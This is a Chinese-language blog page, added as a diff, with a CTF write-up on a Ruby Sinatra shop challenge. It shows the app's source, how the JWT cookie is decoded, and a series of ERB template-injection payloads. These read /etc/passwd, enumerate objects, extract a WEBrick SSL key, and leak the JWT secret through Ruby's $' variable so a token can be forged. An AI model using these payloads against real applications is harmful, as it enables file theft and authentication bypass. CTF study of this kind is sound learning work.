@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>ruby ERB模板注入以及jwt伪造 | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="ruby ERB模板注入以及jwt伪造打开页面后，发现有一个buy flag，但是钱不够，所以我们尝试抓包 发现Cookie字段有一个jwt 1eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJlMWFjYmQ3OC01OTNlLTQ4NzYtOTNhZi00ZWNhYmRkZmYyMDQiLCJqa2wiOjIwfQ.1uVjLWKyyci-TEaw7kxUi9vuGvYDgZ1I">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ruby ERB模板注入以及jwt伪造">
+<meta property="og:url" content="http://example.com/2021/10/17/ruby%20ERB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8Ajwt%E4%BC%AA%E9%80%A0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="ruby ERB模板注入以及jwt伪造打开页面后，发现有一个buy flag，但是钱不够，所以我们尝试抓包 发现Cookie字段有一个jwt 1eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJlMWFjYmQ3OC01OTNlLTQ4NzYtOTNhZi00ZWNhYmRkZmYyMDQiLCJqa2wiOjIwfQ.1uVjLWKyyci-TEaw7kxUi9vuGvYDgZ1I">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-10-16T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-10-17T14:05:35.550Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/SSRF/" style="font-size: 11.25px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.5px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.25px;">http</a> <a href="/tags/java/" style="font-size: 13.75px;">java</a> <a href="/tags/misc/" style="font-size: 11.25px;">misc</a> <a href="/tags/nodejs/" style="font-size: 10px;">nodejs</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.5px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.75px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 11.25px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 16.25px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 11.25px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 15px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.5px;">脚本编写</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-ruby ERB模板注入以及jwt伪造" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/10/17/ruby%20ERB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8Ajwt%E4%BC%AA%E9%80%A0/" class="article-date">
+  	<time datetime="2021-10-16T16:00:00.000Z" itemprop="datePublished">2021-10-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ruby ERB模板注入以及jwt伪造
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ruby-ERB模板注入以及jwt伪造"><a href="#ruby-ERB模板注入以及jwt伪造" class="headerlink" title="ruby ERB模板注入以及jwt伪造"></a>ruby ERB模板注入以及jwt伪造</h1><p>打开页面后，发现有一个buy flag，但是钱不够，所以我们尝试抓包</p>
+<p>发现Cookie字段有一个jwt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJlMWFjYmQ3OC01OTNlLTQ4NzYtOTNhZi00ZWNhYmRkZmYyMDQiLCJqa2wiOjIwfQ.1uVjLWKyyci-TEaw7kxUi9vuGvYDgZ1IF3UuvcIcJtU</span><br></pre></td></tr></table></figure>
+<p>打开jwt.io网页，进行解码</p>
+<p>HEADER</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>PAYLOAD</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;uid&quot;: &quot;e1acbd78-593e-4876-93af-4ecabddff204&quot;,</span><br><span class="line">  &quot;jkl&quot;: 20</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>密钥部分不知道，但是我们可以尝试将PAYLOAD中的jkl改为1000000000000000000000000000，来伪造价格，但是密钥不知道，这里爆破的话有点麻烦，但是我们通过目录的扫描，发现robots.txt文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /filebak</span><br></pre></td></tr></table></figure>
+<p>所以访问/filebak，得到ruby语言的源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">require &#x27;sinatra&#x27;</span><br><span class="line">require &#x27;sinatra/cookies&#x27;</span><br><span class="line">require &#x27;sinatra/json&#x27;</span><br><span class="line">require &#x27;jwt&#x27;</span><br><span class="line">require &#x27;securerandom&#x27;</span><br><span class="line">require &#x27;erb&#x27;</span><br><span class="line"></span><br><span class="line">set :public_folder, File.dirname(__FILE__) + &#x27;/static&#x27;</span><br><span class="line"></span><br><span class="line">FLAGPRICE = 1000000000000000000000000000</span><br><span class="line">ENV[&quot;SECRET&quot;] = SecureRandom.hex(64)</span><br><span class="line"></span><br><span class="line">configure do</span><br><span class="line">  enable :logging</span><br><span class="line">  file = File.new(File.dirname(__FILE__) + &#x27;/../log/http.log&#x27;,&quot;a+&quot;)</span><br><span class="line">  file.sync = true</span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/&quot; do</span><br><span class="line">  redirect &#x27;/shop&#x27;, 302</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/filebak&quot; do</span><br><span class="line">  content_type :text</span><br><span class="line">  erb IO.binread __FILE__</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/api/auth&quot; do</span><br><span class="line">  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">  cookies[:auth] = auth</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/api/info&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line">  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/shop&quot; do</span><br><span class="line">  erb :shop</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/work&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line">  auth = auth[0]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br><span class="line">      puts ENV[&quot;FLAG&quot;]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</span><br><span class="line"></span><br><span class="line">    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">post &quot;/shop&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line"></span><br><span class="line">  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then</span><br><span class="line"></span><br><span class="line">    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)</span><br><span class="line">  else</span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def islogin</span><br><span class="line">  if cookies[:auth].nil? then</span><br><span class="line">    redirect to(&#x27;/shop&#x27;)</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+<p>我们可以查看jwt加密和解密那部分代码</p>
+<p>加密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">get &quot;/api/auth&quot; do</span><br><span class="line">  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">  cookies[:auth] = auth</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+<p>看代码可知，jwt密钥部分是用HS256加密的，口令为ENV[“SECRET”]，所以我们需要想办法知道ENV[“SECRET”]，所以我们可以查看解密的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">get &quot;/work&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line">  auth = auth[0]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br><span class="line">      puts ENV[&quot;FLAG&quot;]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</span><br><span class="line"></span><br><span class="line">    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result</span><br><span class="line"></span><br><span class="line">  end</span><br></pre></td></tr></table></figure>
+<p>我们可以从</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>中的alert()函数，判断它可能是Ruby ERB模板注入</p>
+<h2 id="Ruby-ERB模板注入"><a href="#Ruby-ERB模板注入" class="headerlink" title="Ruby ERB模板注入"></a>Ruby ERB模板注入</h2><p>对与Ruby ERB模板注入来说，&lt;%=是用来执行ruby语句的，会将结果转换为字符串，所以我们可以尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=7*7%&gt;</span><br></pre></td></tr></table></figure>
+<p>来查看它是否存在ruby erb模板注入，如果存在的话，我们可以使用自带的全局函数来测试是否执行函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=File.open(&#x27;/etc/passwd&#x27;).read %&gt;</span><br></pre></td></tr></table></figure>
+<p>如果不可以成功的话，可能是因为Ruby的ERB模板引擎包含一个安全级别参数，当安全级别设置为0以上的某个值（如：3）时，我们将无法在模板绑定中执行包括文件操作在内的某些函数，如果设置为4，则只可以执行标记为可信状态的那些代码，所以此时我们可以尝试枚举该对象的可用属性以及方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=self %&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后可以尝试获取self对象的类名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=self.class.name %&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>得到类名后，我们可以尝试枚举类的可用方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= self.methods %&gt;</span><br></pre></td></tr></table></figure>
+<p>我们可以将数据传递给这些函数，以达到未授权访问的目的，虽然我们不清楚使用的web框架，但是我们要向服务器发送HTTP POST请求，所以我们可以使用handlePOST或doPOST函数内部，来借此访问某些局部变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=self.method(:handle_POST).parameters %&gt;</span><br></pre></td></tr></table></figure>
+<p>我们可以看见3个req参数，该参数可能代表的是某个请求对象，rsp参数可能代表的是响应数据的引用，最后session参数可能是某个id或某个对象，所以我们可以查看session对象的具体含义</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=session.class.name %&gt;</span><br></pre></td></tr></table></figure>
+<p>我们可以看见WEBrick是Ruby在标准库中实现的原生web服务器，我们还可以探索其它有用的信息</p>
+<p>我们可以使用某些内省方法来确认我们是否可以访问这些变量以及其它可用变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=self.instance_variables %&gt;</span><br></pre></td></tr></table></figure>
+<p>当WEBrick被实例化以处理客户端请求时，它会将某个http服务器实例传递给servlet，这很有可能是@server这个实例变量，所以我们可以调用.instance_variables方法来观察这个对象包含哪些成员变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=@server.instance_variables %&gt;</span><br></pre></td></tr></table></figure>
+<p>我们可以看见@ssl_context变量，这个变量可能会包含某些密钥或其它有用信息，所以我们可以改变一下语法来创建自己的局部变量，保存@sll_context的引用，使载荷可读性更好</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% ssl=@server.instance_variable_get(:@ssl_context) %&gt;&lt;%= ssl.instance_variables %&gt;</span><br></pre></td></tr></table></figure>
+<p>此时我们可以看见有@key，所以我们可以提取出这个变量的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% ssl = @server.instance_variable_get(:@ssl_context) %&gt;&lt;%= ssl.instance_variable_get(:@key) %&gt;</span><br></pre></td></tr></table></figure>
+<p>回到题目本身，我们可以构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;%=7*7 %&gt;&amp;do=&lt;%=7*7 %&gt;%20is%20working</span><br></pre></td></tr></table></figure>
+<p>进行测试，发现不可以执行，猜测是因为安全等级的原因，但是可以查看预定义变量，由于前面有进行匹配的操作，且进行匹配的代码是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br></pre></td></tr></table></figure>
+<p>所以我们可以使用$’预定义变量来进行模板注入，从而读取ENV[“SCERET”]的值，而首先进行的匹配是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;</span><br></pre></td></tr></table></figure>
+<p>所以然后再用匹配后的值再进行匹配，所以SECRET参数的值最好为空，所以可以构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;%=$&#x27;%&gt;&amp;do=&lt;%=$&#x27;%&gt;%20is%20working&amp;$SECRET=</span><br></pre></td></tr></table></figure>
+<p>来读取ENV[“SECRET”]的值，然后用来伪造jwt，即可获得flag</p>
+<p>参考文章：[<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86867]">https://www.anquanke.com/post/id/86867]</a></p>
+<pre><code>[https://www.wangan.com/docs/255]
+
+[https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html]
+
+[https://www.jianshu.com/p/4f316191f595]
+</code></pre>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/10/14/pop%E9%93%BE4%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">pop链4之反序列化逃逸</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="ruby ERB模板注入以及jwt伪造" data-title="ruby ERB模板注入以及jwt伪造" data-url="http://example.com/2021/10/17/ruby%20ERB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8Ajwt%E4%BC%AA%E9%80%A0/"  data-images="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" data-content="ruby ERB模板注入以及jwt伪造">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2021 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
